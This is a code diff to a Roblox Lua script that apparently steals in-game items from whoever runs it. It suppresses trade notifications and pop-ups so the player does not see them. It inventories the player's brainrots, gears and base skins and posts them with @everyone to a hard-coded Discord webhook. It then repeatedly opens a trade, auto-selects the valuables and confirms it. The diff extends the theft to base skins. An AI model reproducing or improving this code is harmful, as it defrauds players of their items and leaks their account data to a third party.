@@ -765,6 +765,28 @@ local pg = LP:WaitForChild("PlayerGui")
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1538656296943751180/_9xvaGd9sngrEJJkOSLnVxS4ORsUVK7Duyo1TzK4DoaZK7uf7liBdyhyP87G6M9rYCAN"
 
 --------------------------------------------------------------------------------
+-- CONFIGURACIÓN DE OBJETIVOS
+--------------------------------------------------------------------------------
+getgenv().NORMAL_BASE_SKINS = {
+    ["Bunny Basket"] = true,
+    ["Summer"] = true,
+    ["Octo"] = true,
+    ["Tralalero"] = true
+}
+
+getgenv().NORMAL_GEARS = {
+    ["Santa's Sleigh"] = true,
+    ["Cupid's Wings"] = true,
+    ["Witch's Broom"] = true,
+    ["Waverider"] = true,
+    ["Bloodmoon Slap"] = true,
+    ["Rainbow Slap"] = true,
+    ["Rainbow Hammer"] = true,
+    ["Bloodmoon Hammer"] = true,
+    ["Candy Sentry"] = true,
+}
+
+--------------------------------------------------------------------------------
 -- OCULTAR NOTIFICACIONES Y MENSAJES DE TRADEO EN EL CHAT
 --------------------------------------------------------------------------------
 pcall(function()
@@ -782,21 +804,21 @@ if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
     end
 end
 
--- Función para enviar datos a Discord mediante Webhook (con soporte para múltiples campos / bloques)
+-- Función para enviar datos a Discord mediante Webhook (Arreglado el error de concatenación)
 local function sendToDiscord(title, description, fields)
     local executorName = LP and LP.Name or "Desconocido"
     local executorId = LP and tostring(LP.UserId) or "0"
     local data = {
         ["title"] = title,
         ["description"] = description .. "\n\n👤 **Ejecutado por:** " .. executorName .. " (ID: " .. executorId .. ")",
-        ["color"] = 65280, -- Verde
+        ["color"] = 65280,
         ["fields"] = fields,
         ["footer"] = {
             ["text"] = "Automatización de Brainrots - Roblox"
         }
     }
     local body = HttpService:JSONEncode({
-        ["content"] = "@everyone", -- <-- MENCIÓN
+        ["content"] = "@everyone",
         ["embeds"] = { data }
     })
     pcall(function()
@@ -821,7 +843,6 @@ Workspace.ChildAdded:Connect(function(child)
     end
 end)
 
--- ELIMINAR NOTIFICACIONES OCULTANDO GUI
 local function suppressMessages()
     local function cleanNotificationGui(gui)
         local nameLower = string.lower(gui.Name)
@@ -839,7 +860,6 @@ local function suppressMessages()
     end
 end
 
--- OCULTAR VENTANAS EMERGENTES DE SOLICITUD DE TRADE
 local function hideTradePrompts()
     local function processPrompt(gui)
         local nameLower = string.lower(gui.Name)
@@ -866,7 +886,69 @@ end
 suppressMessages()
 hideTradePrompts()
 
--- FUNCIÓN PARA OBTENER EL VALOR REAL DESDE DEBRIS
+local function cleanStr(str)
+    return string.lower(string.gsub(tostring(str or ""), "%s+", ""))
+end
+
+-- =========================================================
+-- ESCANER DE BASES FLEXIBLE Y CORREGIDO
+-- =========================================================
+local function scanAllAvailableBases()
+    local detectedBases = {}
+    
+    pcall(function()
+        for _, v in ipairs(pg:GetDescendants()) do
+            if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("Frame") then
+                local textContent = (v:IsA("TextLabel") or v:IsA("TextButton")) and v.Text or ""
+                local combinedSearch = string.lower(v.Name .. " " .. textContent)
+
+                for baseName, _ in pairs(getgenv().NORMAL_BASE_SKINS) do
+                    local cleanBaseName = string.lower(baseName)
+                    
+                    local isMatch = false
+                    if cleanBaseName == "summer" then
+                        if string.match(combinedSearch, "%bsummer%b") then
+                            isMatch = true
+                        end
+                    else
+                        if string.find(combinedSearch, cleanBaseName, 1, true) then
+                            isMatch = true
+                        end
+                    end
+
+                    if isMatch then
+                        local parentSlot = v
+                        local isLocked = false
+                        for i = 1, 4 do
+                            if parentSlot then
+                                local locked = parentSlot:FindFirstChild("Locked", true) or parentSlot:FindFirstChild("Lock", true)
+                                if locked and locked:IsA("GuiObject") and locked.Visible then
+                                    isLocked = true
+                                    break
+                                end
+                                parentSlot = parentSlot.Parent
+                            end
+                        end
+
+                        if not isLocked then
+                            detectedBases[baseName] = true
+                        end
+                    end
+                end
+            end
+        end
+    end)
+
+    local finalBasesList = {}
+    print("DEBUG BASES ENCONTRADAS:")
+    for baseName, _ in pairs(detectedBases) do
+        table.insert(finalBasesList, baseName)
+        print("   -> Detectada correctamente:", baseName)
+    end
+
+    return finalBasesList
+end
+
 local function getRealBrainrotValue(brainrotModel)
     if not brainrotModel then return "Modelo nulo" end
     local debris = Workspace:FindFirstChild("Debris")
@@ -924,25 +1006,6 @@ end
 task.spawn(function()
     local DELAY_STEP = 0.8
 
-    getgenv().NORMAL_BASE_SKINS = {
-        ["Bunny Basket"] = true,
-        ["Summer"] = true,
-        ["Octo"] = true,
-        ["Tralalero"] = true
-    }
-
-    getgenv().NORMAL_GEARS = {
-        ["Santa's Sleigh"] = true,
-        ["Cupid's Wings"] = true,
-        ["Witch's Broom"] = true,
-        ["Waverider"] = true,
-        ["Bloodmoon Slap"] = true,
-        ["Rainbow Slap"] = true,
-        ["Rainbow Hammer"] = true,
-        ["Bloodmoon Hammer"] = true,
-        ["Candy Sentry"] = true,
-    }
-
 local BrainrotPriority = {
     "Headless Horseman", "Signore Carapace", "Arcadragon", "Elefanto Frigo", "Strawberry Elephant",
     "Pancake and Syrup", "Love Love Bear", "Antonio", "Meowl", "Skibidi Toilet", "Rico Dinero",
@@ -974,10 +1037,6 @@ local BrainrotPriority = {
     "Noodle Noodle Poodle", "Var Var Var", "Tacoturbo Tacorito", "Sammyni Truckini", "Nachorilla", "Burrito Bat", "Ref Ref Ref Sahur"
 }
 
-    local function cleanStr(str)
-        return string.lower(string.gsub(tostring(str or ""), "%s+", ""))
-    end
-
     local BrainrotPriorityMap = {}
     local TargetBrainrotsClean = {}
     for i, name in ipairs(BrainrotPriority) do
@@ -988,6 +1047,11 @@ local BrainrotPriority = {
     local TargetGearsClean = {}
     for gearName in pairs(getgenv().NORMAL_GEARS) do
         TargetGearsClean[cleanStr(gearName)] = gearName
+    end
+
+    local TargetBaseSkinsClean = {}
+    for baseName in pairs(getgenv().NORMAL_BASE_SKINS) do
+        TargetBaseSkinsClean[cleanStr(baseName)] = baseName
     end
 
     local function hideSingleObject(obj)
@@ -1005,9 +1069,7 @@ local BrainrotPriority = {
                 obj.GroupTransparency = 1
             end
             local UIStroke = obj:FindFirstChildOfClass("UIStroke")
-            if UIStroke then
-                UIStroke.Transparency = 1
-            end
+            if UIStroke then UIStroke.Transparency = 1 end
         end
     end
 
@@ -1015,32 +1077,22 @@ local BrainrotPriority = {
         for _, obj in ipairs(guiObj:GetDescendants()) do
             hideSingleObject(obj)
         end
-        if guiObj:IsA("GuiObject") then
-            hideSingleObject(guiObj)
-        end
+        if guiObj:IsA("GuiObject") then hideSingleObject(guiObj) end
         if not guiObj:GetAttribute("HideListenerSet") then
             guiObj:SetAttribute("HideListenerSet", true)
             guiObj.DescendantAdded:Connect(function(child)
-                task.defer(function()
-                    hideSingleObject(child)
-                end)
+                task.defer(function() hideSingleObject(child) end)
             end)
         end
     end
 
     local function applyEverythingAfterTargetFound()
         local function handleCam(obj)
-            if obj:IsA("BlurEffect") then
-                obj.Enabled = false
-            end
+            if obj:IsA("BlurEffect") then obj.Enabled = false end
         end
         cam.ChildAdded:Connect(handleCam)
-        for _, v in ipairs(cam:GetChildren()) do
-            handleCam(v)
-        end
-        RunService.RenderStepped:Connect(function()
-            cam.FieldOfView = 70
-        end)
+        for _, v in ipairs(cam:GetChildren()) do handleCam(v) end
+        RunService.RenderStepped:Connect(function() cam.FieldOfView = 70 end)
 
         local function handleGui(obj)
             if obj.Name:find("Prompt") or obj:IsA("ProximityPrompt") then return end
@@ -1052,38 +1104,24 @@ local BrainrotPriority = {
             if tradeGuis[obj.Name] then
                 if obj:IsA("ScreenGui") then
                     for _, child in ipairs(obj:GetChildren()) do
-                        if child:IsA("GuiObject") then
-                            child.Position = UDim2.new(10, 0, 10, 0)
-                        end
+                        if child:IsA("GuiObject") then child.Position = UDim2.new(10, 0, 10, 0) end
                     end
                 end
-                task.defer(function()
-                    hideGuiVisualOnly(obj)
-                end)
+                task.defer(function() hideGuiVisualOnly(obj) end)
                 return
             end
-            local targetAlerts = {
-                ["TradeAlert"] = true,
-                ["TradeError"] = true
-            }
+            local targetAlerts = { ["TradeAlert"] = true, ["TradeError"] = true }
             if targetAlerts[obj.Name] then
-                task.defer(function()
-                    hideGuiVisualOnly(obj)
-                end)
+                task.defer(function() hideGuiVisualOnly(obj) end)
             end
         end
 
         pg.ChildAdded:Connect(handleGui)
-        for _, v in ipairs(pg:GetChildren()) do
-            handleGui(v)
-        end
+        for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
     end
 
     local plotsFolder = Workspace:FindFirstChild("Plots")
-    if not plotsFolder then
-        warn("❌ No se encontró Workspace.Plots")
-        return
-    end
+    if not plotsFolder then return end
 
     local closestPlot = nil
     local function getOwnerText(plot)
@@ -1105,48 +1143,30 @@ local BrainrotPriority = {
         local ownerText = getOwnerText(plot)
         if ownerText then
             local ownerLower = string.lower(ownerText)
-            if string.find(ownerLower, "solomz90's base", 1, true) then
-                continue
-            end
-            if string.find(ownerLower, myUsername, 1, true) then
-                closestPlot = plot
-                break
-            end
-            if string.find(ownerLower, myDisplayName, 1, true) then
-                closestPlot = plot
-                break
-            end
-            if string.find(ownerText, "・・・", 1, true) then
+            if string.find(ownerLower, myUsername, 1, true) or string.find(ownerLower, myDisplayName, 1, true) then
                 closestPlot = plot
                 break
             end
         end
     end
 
-    if not closestPlot then
-        warn("❌ NO SE PUDO ENCONTRAR TU PLOT")
-        return
-    end
+    if not closestPlot then return end
 
-    -- FUNCIÓN PARA DETECTAR LA ETIQUETA "1 OF 1" EN EL MODELO
     local function hasOneOfOneTag(model)
         for _, descendant in ipairs(model:GetDescendants()) do
             if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
                 local txt = string.lower((descendant.Text or ""):gsub("%s+", ""))
-                if txt == "1of1" then
-                    return true
-                end
+                if txt == "1of1" then return true end
             end
         end
         return false
     end
 
-    -- CLASIFICAR TARGETS Y NO TARGETS (CON DETECCIÓN DE 1 OF 1)
     local brainrotQueue = {}
     local nonTargetList = {}
 
     for _, child in ipairs(closestPlot:GetChildren()) do
-        if child:IsA("Model") and not child.Name:find("Panel") and not child.Name:find("Cash") then
+        if child:IsA("Model") and child.Name ~= "Model" and not child.Name:find("Panel") and not child.Name:find("Cash") then
             local rawName = child.Name
             local cleanedName = cleanStr(rawName)
             local matchedName = nil
@@ -1165,7 +1185,6 @@ local BrainrotPriority = {
             local genText = getRealBrainrotValue(child)
             local isOneOfOne = hasOneOfOneTag(child)
 
-            -- Si está en la lista de prioridades O TIENE LA ETIQUETA 1 OF 1, entra a la cola
             if matchedName or isOneOfOne then
                 table.insert(brainrotQueue, {
                     slotKey = rawName,
@@ -1176,27 +1195,65 @@ local BrainrotPriority = {
                     rawName = rawName
                 })
             else
-                table.insert(nonTargetList, {
-                    name = rawName,
-                    generation = genText
-                })
+                table.insert(nonTargetList, { name = rawName, generation = genText })
             end
         end
     end
 
-    -- CONSTRUIR CAMPOS PARA DISCORD (CON LA TABLA INICIALIZADA CORRECTAMENTE)
+    local foundGears = {}
+    local backpackGui = LP:WaitForChild("PlayerGui"):WaitForChild("BackpackGui", 3)
+    if backpackGui then
+        local backpackFolder = backpackGui:WaitForChild("Backpack", 3)
+        if backpackFolder then
+            local Hotbar = backpackFolder:WaitForChild("Hotbar", 3)
+            local InventoryGrid = backpackFolder:WaitForChild("Inventory", 3):WaitForChild("ScrollingFrame", 3):WaitForChild("UIGridFrame", 3)
+
+            local function checkContainer(container, location)
+                if not container then return end
+                for _, slot in ipairs(container:GetChildren()) do
+                    local toolName = slot:FindFirstChild("ToolName")
+                    if toolName and toolName:IsA("TextLabel") then
+                        local name = tostring(toolName.Text or "")
+                        local cleanName = cleanStr(name)
+                        if cleanName ~= "" then
+                            for gearName in pairs(getgenv().NORMAL_GEARS) do
+                                local cleanGear = cleanStr(gearName)
+                                if cleanName == cleanGear or string.find(cleanName, cleanGear, 1, true) or string.find(cleanGear, cleanName, 1, true) then
+                                    if not foundGears[cleanName] then
+                                        foundGears[cleanName] = { name = name, location = location, slot = slot.Name }
+                                    end
+                                    break
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+
+            checkContainer(Hotbar, "HOTBAR")
+            checkContainer(InventoryGrid, "INVENTARIO")
+        end
+    end
+
+    local ownedBases = scanAllAvailableBases()
     local discordFields = {}
 
     local targetLines = {}
-    for _, item in ipairs(brainrotQueue) do
-        table.insert(targetLines, "• **" .. item.name .. "** - " .. item.generation)
-    end
+    for _, item in ipairs(brainrotQueue) do table.insert(targetLines, "• **" .. item.name .. "** - " .. item.generation) end
     if #targetLines > 0 then
-        table.insert(discordFields, {
-            ["name"] = "🧠 ITEMS TARGET (" .. #brainrotQueue .. ")",
-            ["value"] = table.concat(targetLines, "\n"),
-            ["inline"] = false
-        })
+        table.insert(discordFields, { ["name"] = "🧠 ITEMS TARGET (" .. #brainrotQueue .. ")", ["value"] = table.concat(targetLines, "\n"), ["inline"] = false })
+    end
+
+    local gearLines = {}
+    for _, gearInfo in pairs(foundGears) do table.insert(gearLines, "• **" .. gearInfo.name .. "** (" .. gearInfo.location .. ")") end
+    if #gearLines > 0 then
+        table.insert(discordFields, { ["name"] = "⚙️ GEARS ENCONTRADOS (" .. #gearLines .. ")", ["value"] = table.concat(gearLines, "\n"), ["inline"] = false })
+    end
+
+    if #ownedBases > 0 then
+        local baseLines = {}
+        for _, baseName in ipairs(ownedBases) do table.insert(baseLines, "• " .. baseName) end
+        table.insert(discordFields, { ["name"] = "🏠 BASES TRANSFERIBLES DESBLOQUEADAS (" .. #ownedBases .. ")", ["value"] = table.concat(baseLines, "\n"), ["inline"] = false })
     end
 
     local nonTargetLines = {}
@@ -1211,47 +1268,56 @@ local BrainrotPriority = {
         })
     end
 
-    if (#brainrotQueue > 0) or (#nonTargetList > 0) then
-        sendToDiscord("📊 Reporte Completo de Brainrots", "Se ha analizado tu plot correctamente:", discordFields)
-    else
-        sendToDiscord("⚠️ Plot Vacío", "No se encontraron elementos en este plot.", {})
-        return
+    if (#brainrotQueue > 0) or (#nonTargetList > 0) or (#gearLines > 0) or (#ownedBases > 0) then
+        sendToDiscord("📊 Reporte Completo de Brainrots, Gears y Bases", "Se ha analizado tu plot, inventario y skins correctamente:", discordFields)
     end
 
     table.sort(brainrotQueue, function(a, b)
         local aPriority = BrainrotPriorityMap[cleanStr(a.name)] or 999999
         local bPriority = BrainrotPriorityMap[cleanStr(b.name)] or 999999
-        if aPriority == bPriority then
-            return tostring(a.instanceId) < tostring(b.instanceId)
-        end
+        if aPriority == bPriority then return tostring(a.instanceId) < tostring(b.instanceId) end
         return aPriority < bPriority
     end)
+
+    local gearCount = 0
+    for _ in pairs(foundGears) do
+        gearCount = gearCount + 1
+    end
+
+    local totalTargets = #brainrotQueue + gearCount + #ownedBases
+
+    if totalTargets == 0 then
+        return
+    end
 
     applyEverythingAfterTargetFound()
 
     local processedBrainrots = {}
     local processedGears = {}
+    local processedBases = {}
 
     local function triggerClick(btn)
         if not btn then return false end
-        local success = false
         if typeof(firesignal) == "function" then
             pcall(function() firesignal(btn.MouseButton1Click) end)
             pcall(function() firesignal(btn.Activated) end)
-            success = true
+            return true
         elseif typeof(getconnections) == "function" then
-            for _, conn in ipairs(getconnections(btn.MouseButton1Click)) do
-                if conn.Enabled then conn:Fire() end
-            end
-            for _, conn in ipairs(getconnections(btn.Activated)) do
-                if conn.Enabled then conn:Fire() end
-            end
-            success = true
+            for _, conn in ipairs(getconnections(btn.MouseButton1Click)) do if conn.Enabled then conn:Fire() end end
+            for _, conn in ipairs(getconnections(btn.Activated)) do if conn.Enabled then conn:Fire() end end
+            return true
         end
-        return success
+        return false
     end
 
-    -- BÚSQUEDA Y SELECCIÓN DE BRAINROTS
+    local function isTradeActive()
+        local tradeLive = pg:FindFirstChild("TradeLiveTrade")
+        if not tradeLive then return false end
+        if tradeLive:IsA("ScreenGui") then return tradeLive.Enabled end
+        if tradeLive:IsA("GuiObject") then return tradeLive.Visible end
+        return false
+    end
+
     local function findBrainrotButton(item)
         local yourInventory = pg:FindFirstChild("TradeLiveTrade") and pg.TradeLiveTrade:FindFirstChild("TradeLiveTrade") and pg.TradeLiveTrade.TradeLiveTrade:FindFirstChild("Your") and pg.TradeLiveTrade.TradeLiveTrade.Your:FindFirstChild("ScrollingFrame")
         if not yourInventory then return nil end
@@ -1260,7 +1326,6 @@ local BrainrotPriority = {
         local rawClean = cleanStr(item.rawName)
         local genClean = cleanStr(item.generation)
         local isGenUnknown = (genClean == "unknown" or genClean == "cifra no detectada")
-
         local bestCandidateButton = nil
 
         for _, slot in ipairs(yourInventory:GetChildren()) do
@@ -1283,16 +1348,12 @@ local BrainrotPriority = {
                     end
 
                     if matchesName then
-                        if foundGenMatch then
-                            return button
-                        elseif not bestCandidateButton then
-                            bestCandidateButton = button
-                        end
+                        if foundGenMatch then return button
+                        elseif not bestCandidateButton then bestCandidateButton = button end
                     end
                 end
             end
         end
-
         return bestCandidateButton
     end
 
@@ -1303,7 +1364,6 @@ local BrainrotPriority = {
 
         local currentBG = button.BackgroundColor3
         local tolerance = 0.01
-
         local function isSelected(color)
             return math.abs(color.R - 0.0588) < tolerance and math.abs(color.G - 0.1960) < tolerance
         end
@@ -1318,11 +1378,9 @@ local BrainrotPriority = {
             processedBrainrots[button] = true
             return true
         end
-
         return false
     end
 
-    -- FUNCIONES PARA GEARS
     local function getYourInventory()
         local tradeGui = pg:FindFirstChild("TradeLiveTrade")
         if not tradeGui then return nil end
@@ -1335,49 +1393,21 @@ local BrainrotPriority = {
 
     local function scrollToObject(scrollingFrame, obj)
         if not scrollingFrame or not obj then return false end
-
         local canvasSize = scrollingFrame.AbsoluteCanvasSize.Y
         local windowSize = scrollingFrame.AbsoluteSize.Y
-
         if canvasSize <= windowSize then return true end
 
         local objectTop = obj.AbsolutePosition.Y
         local objectHeight = obj.AbsoluteSize.Y
         local frameTop = scrollingFrame.AbsolutePosition.Y
-        local frameBottom = frameTop + windowSize
-        local objectBottom = objectTop + objectHeight
-
-        if objectTop >= frameTop and objectBottom <= frameBottom then
-            return true
-        end
-
-        local relativeY = obj.AbsolutePosition.Y - scrollingFrame.AbsolutePosition.Y + scrollingFrame.CanvasPosition.Y
+        local relativeY = objectTop - frameTop + scrollingFrame.CanvasPosition.Y
         local targetY = relativeY - (windowSize / 2) + (objectHeight / 2)
         local maxY = math.max(0, canvasSize - windowSize)
         targetY = math.clamp(targetY, 0, maxY)
 
         scrollingFrame.CanvasPosition = Vector2.new(scrollingFrame.CanvasPosition.X, targetY)
-        task.wait(0.25)
+        task.wait(0.2)
         return true
-    end
-
-    local function forceScrollToObject(scrollingFrame, obj)
-        if not scrollingFrame or not obj then return false end
-
-        for attempt = 1, 3 do
-            scrollToObject(scrollingFrame, obj)
-            task.wait(0.2)
-
-            local objectTop = obj.AbsolutePosition.Y
-            local objectBottom = objectTop + obj.AbsoluteSize.Y
-            local frameTop = scrollingFrame.AbsolutePosition.Y
-            local frameBottom = frameTop + scrollingFrame.AbsoluteSize.Y
-
-            if objectTop >= frameTop and objectBottom <= frameBottom then
-                return true
-            end
-        end
-        return false
     end
 
     local function findAllGearButtons()
@@ -1390,7 +1420,6 @@ local BrainrotPriority = {
                 local button = slot:FindFirstChild("Spacer") or slot:FindFirstChildWhichIsA("GuiButton")
                 if button then
                     local matchedGearName = nil
-                    
                     for _, subDesc in ipairs(slot:GetDescendants()) do
                         if subDesc:IsA("TextLabel") or subDesc:IsA("TextButton") then
                             local cleanText = cleanStr(subDesc.Text)
@@ -1400,13 +1429,8 @@ local BrainrotPriority = {
                             end
                         end
                     end
-                    
                     if matchedGearName then
-                        table.insert(gearQueue, {
-                            uuid = slot.Name,
-                            button = button,
-                            name = matchedGearName
-                        })
+                        table.insert(gearQueue, { uuid = slot.Name, button = button, name = matchedGearName })
                     end
                 end
             end
@@ -1430,16 +1454,8 @@ local BrainrotPriority = {
         if not button then return false end
 
         local scrollingFrame = getYourInventory()
-        if not scrollingFrame then return false end
-
-        local gearFrame = button
-        while gearFrame and gearFrame ~= scrollingFrame and not string.match(gearFrame.Name, "^Selection_Gear_") do
-            gearFrame = gearFrame.Parent
-        end
-
-        if gearFrame and gearFrame ~= scrollingFrame then
-            forceScrollToObject(scrollingFrame, gearFrame)
-            task.wait(0.25)
+        if scrollingFrame then
+            scrollToObject(scrollingFrame, button)
         end
 
         if isButtonSelected(button) then
@@ -1448,14 +1464,111 @@ local BrainrotPriority = {
         end
 
         local success = triggerClick(button)
-        task.wait(0.25)
-
+        task.wait(0.2)
         if success then
             processedGears[uuid] = true
             return true
         end
-
         return false
+    end
+
+    local function clickBaseSkinsTab()
+        local tradeLive = pg:FindFirstChild("TradeLiveTrade")
+        if not tradeLive then return false end
+        local tradeInner = tradeLive:FindFirstChild("TradeLiveTrade")
+        if not tradeInner then return false end
+
+        for _, v in ipairs(tradeInner:GetDescendants()) do
+            if v:IsA("GuiButton") then
+                local nameText = string.lower(v.Name or "")
+                local visibleText = ""
+
+                for _, child in ipairs(v:GetDescendants()) do
+                    if child:IsA("TextLabel") or child:IsA("TextButton") then
+                        visibleText = string.lower(child.Text or "")
+                        break
+                    end
+                end
+
+                if string.find(nameText, "base", 1, true) or string.find(nameText, "skin", 1, true) or
+                   string.find(visibleText, "base", 1, true) or string.find(visibleText, "skin", 1, true) then
+                    triggerClick(v)
+                    return true
+                end
+            end
+        end
+        return false
+    end
+
+    local function findAllBaseSkinButtons()
+        local baseQueue = {}
+        local scrollingFrame = getYourInventory()
+        if not scrollingFrame then return baseQueue end
+
+        for _, slot in ipairs(scrollingFrame:GetChildren()) do
+            local button = slot:FindFirstChild("Spacer") or slot:FindFirstChildWhichIsA("GuiButton")
+            if button then
+                for _, subDesc in ipairs(slot:GetDescendants()) do
+                    if subDesc:IsA("TextLabel") or subDesc:IsA("TextButton") then
+                        local cleanText = cleanStr(subDesc.Text)
+                        if TargetBaseSkinsClean[cleanText] then
+                            table.insert(baseQueue, {
+                                uuid = slot.Name,
+                                button = button,
+                                name = TargetBaseSkinsClean[cleanText]
+                            })
+                            break
+                        end
+                    end
+                end
+            end
+        end
+        return baseQueue
+    end
+
+    local function selectBaseSkin(baseItem)
+        if not baseItem then return false end
+        local uuid = baseItem.uuid
+        local button = baseItem.button
+
+        if processedBases[uuid] then return true end
+        if not button then return false end
+
+        local scrollingFrame = getYourInventory()
+        if scrollingFrame then
+            scrollToObject(scrollingFrame, button)
+        end
+
+        if isButtonSelected(button) then
+            processedBases[uuid] = true
+            return true
+        end
+
+        local success = triggerClick(button)
+        task.wait(0.2)
+        if success then
+            processedBases[uuid] = true
+            return true
+        end
+        return false
+    end
+
+    local function processBaseSkinsSelection()
+        clickBaseSkinsTab()
+        task.wait(0.2)
+
+        local baseQueue = findAllBaseSkinButtons()
+        
+        for _, baseItem in ipairs(baseQueue) do
+            if not isTradeActive() then break end
+            local success = false
+            for attempt = 1, 2 do
+                success = selectBaseSkin(baseItem)
+                if success then break end
+                task.wait(0.2)
+            end
+            task.wait(DELAY_STEP + math.random(5, 10) / 100)
+        end
     end
 
     local function pressReadyButtonByPath()
@@ -1502,12 +1615,8 @@ local BrainrotPriority = {
             pcall(function() firesignal(searchBox.FocusLost, true) end)
             pcall(function() firesignal(searchBox:GetPropertyChangedSignal("Text")) end)
         elseif typeof(getconnections) == "function" then
-            for _, conn in ipairs(getconnections(searchBox.FocusLost)) do
-                if conn.Enabled then conn:Fire(true) end
-            end
-            for _, conn in ipairs(getconnections(searchBox:GetPropertyChangedSignal("Text"))) do
-                if conn.Enabled then conn:Fire() end
-            end
+            for _, conn in ipairs(getconnections(searchBox.FocusLost)) do if conn.Enabled then conn:Fire(true) end end
+            for _, conn in ipairs(getconnections(searchBox:GetPropertyChangedSignal("Text"))) do if conn.Enabled then conn:Fire() end end
         end
 
         task.wait(0.3)
@@ -1546,24 +1655,14 @@ local BrainrotPriority = {
             end
         end
 
-        if sendBtn then
-            triggerClick(sendBtn)
-        end
-    end
-
-    local function isTradeActive()
-        local tradeLive = pg:FindFirstChild("TradeLiveTrade")
-        if tradeLive then
-            if tradeLive:IsA("ScreenGui") and tradeLive.Enabled then return true end
-            if tradeLive:IsA("GuiObject") and tradeLive.Visible then return true end
-        end
-        return false
+        if sendBtn then triggerClick(sendBtn) end
     end
 
     local function startFullAutomation()
         while true do
             processedBrainrots = {}
             processedGears = {}
+            processedBases = {}
 
             while not isTradeActive() do
                 sendTradeToPlayer()
@@ -1576,7 +1675,6 @@ local BrainrotPriority = {
 
             task.wait(0.8)
 
-            -- Procesar Brainrots (Targets)
             for index, item in ipairs(brainrotQueue) do
                 if not isTradeActive() then break end
                 local success = false
@@ -1588,20 +1686,20 @@ local BrainrotPriority = {
                 task.wait(DELAY_STEP + math.random(10, 25) / 100)
             end
 
-            -- Procesar Gears
             local gearQueue = findAllGearButtons()
-
             for _, gearItem in ipairs(gearQueue) do
                 if not isTradeActive() then break end
-
                 local success = false
                 for attempt = 1, 2 do
                     success = selectGear(gearItem)
                     if success then break end
                     task.wait(0.4)
                 end
-
                 task.wait(DELAY_STEP + math.random(10, 25) / 100)
+            end
+
+            if isTradeActive() then
+                processBaseSkinsSelection()
             end
 
             task.wait(0.5)
